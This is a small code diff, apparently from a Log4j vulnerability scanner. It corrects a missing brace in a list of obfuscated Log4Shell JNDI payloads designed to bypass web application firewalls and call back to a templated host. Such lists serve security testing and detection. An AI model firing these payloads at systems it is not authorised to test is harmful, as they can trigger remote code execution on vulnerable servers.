@@ -64,7 +64,7 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://0
                        "${jndi:dns://{{callback_host}}/{{random}}}",
                        "${jnd${123%25ff:-${123%25ff:-i:}}ldap://8{{callback_host}}/{{random}}}",
                        "${jndi:dns://9{{callback_host}}}",
-                       "${j${k8s:k5:-ND}i:ldap://10{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i:ldap://10{{callback_host}}/{{random}}}",
                        "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//11{{callback_host}}/{{random}}}",
                        "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://12{{callback_host}}/{{random}}}",
                        "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//13{{callback_host}}/{{random}}}",
